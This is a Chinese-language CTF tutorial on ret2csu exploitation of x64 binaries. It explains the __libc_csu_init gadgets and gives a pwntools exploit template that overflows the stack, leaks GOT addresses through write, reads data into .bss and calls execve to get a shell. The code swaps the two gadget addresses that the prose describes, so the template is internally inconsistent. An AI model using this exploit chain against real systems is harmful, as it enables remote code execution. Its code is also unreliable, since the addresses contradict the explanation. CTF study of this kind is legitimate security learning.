0x00 ret to csu

在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。这时候，我们可以利用 x64下的__libc_csu_init中的gadgets。

这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc 函数，所以这个函数一定会存在,但是不同版本的会有一定的区别

利用思路

利用思路

  • 从 0x000000000040061A 一直到结尾 可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据

  • 从 0x0000000000400600 到 0x0000000000400609，可以执行rdx = r13, rsi = r14，rdi = r15（这里赋给的是edi，但此时rdi的高32位寄存器值为 0（自行调试），所以其实我们可以控制rdi寄存器的值，只不过只能控制低 32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx 为0，r12 为存储我们想要调用的函数的地址。

  • 从 0x000000000040060D 到 0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1 = rbp，这样就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1

  • 对字节码稍加偏移也可以得到pop rsi ; pop r15 ; ret和pop rdi ; ret

exp模板

from pwn import *
from LibcSearcher import *

proc_game = './pwnme'

io = remote('xxxx',xxxx)

context.log_level = 'debug'

elf = ELF(proc_game)

write_got = elf.got['write']
read_got = elf.got['read']
main_addr = elf.symbols['main']
bss_base = elf.bss()

pop_rbx_rbp_r12_r13_r14_r15_ret = 0x0000000000400600
mov_rdx_rsi_rdi_call = 0x000000000040061A
offset = 0x80
fake_bp = 8

def csu(rbx, rbp, r12, r13, r14, r15, ret_addr):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13

    payload = 'A' * offset
    payload += 'B' * fake_bp
    payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret)
    payload += p64(rbx)
    payload += p64(rbp)
    payload += p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    payload += p64(mov_rdx_rsi_rdi_call)
    payload += 'C' * 0x38
    payload += p64(ret_addr)

    io.send(payload)
    sleep(1)

## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)
## read(0,bss_base,16)
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)

思路

main()函数中调用vuln()函数

vuln()函数调用了sys_read(0, buf, 0x400uLL)，存在栈溢出漏洞可以利用

gadget()函数中，存在两个控制rax寄存器的gadget，分别是15 sys_rt_sigreturn和59 sys_execve

可以选择15来进行SROP，也可以选择59通过ret2csu来getshell
